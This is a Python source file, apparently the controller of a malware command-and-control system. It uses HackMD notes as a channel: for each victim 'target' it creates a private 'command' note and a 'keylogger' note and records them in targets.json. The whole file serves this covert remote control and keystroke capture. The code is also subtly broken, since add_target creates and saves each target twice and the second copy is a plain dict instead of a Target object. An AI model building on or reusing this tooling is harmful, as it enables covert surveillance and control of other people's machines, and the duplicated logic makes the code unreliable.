import os
import json
from PyHackMD import API
from . import *


class NoteManager:
    note_list = []
    targets: dict[str, Target] = {}

    def __init__(self, api: API):
        self.api = api
        # self.update_note_list()
        self.load_targets()

    def update_note_list(self):
        self.note_list = self.api.get_note_list()

    def load_targets(self):
        try:
            with open("targets.json", "r") as f:
                data = json.load(f)
                self.targets = {name: Target.from_dict(
                    target_data) for name, target_data in data.items()}
        except FileNotFoundError:
            self.targets = {}

    def save_targets(self):
        if not self.targets:
            return
        targets_data = {name: target.to_dict()
                        for name, target in self.targets.items()}
        with open("targets.json", "w") as f:
            json.dump(targets_data, f, indent=2)

    def list_targets(self):
        print("Available targets:")
        for target in self.targets.values():
            print(f"- {target.name}")

    def add_target(self, target_name: str):
        if self.targets.get(target_name) is not None:
            print(f"Target {target_name} already exists.")
            return

        new_target = Target(
            name=target_name,
            note_id=self.create_note(
                title=f"{target_name} command", content=INIT_CONTENT),
            real_time_note_id=self.create_note(
                title=f"{target_name} keylogger", content=INIT_REAL_TIME_CONTENT)
        )

        self.targets[target_name] = new_target
        self.save_targets()

        new_target: Target = {
            "name": target_name,
            "note_id": self.create_note(
                title=f"{target_name} command", content=INIT_CONTENT),
            "real_time_note_id": self.create_note(
                title=f"{target_name} keylogger", content=INIT_REAL_TIME_CONTENT)
        }

        self.targets[target_name] = new_target
        self.save_targets()

    def create_note(self, title: str, content: str):
        note = self.api.create_note(
            title=title, content=content, read_permission="owner", write_permission="owner", comment_permission="owners")
        return note['id']
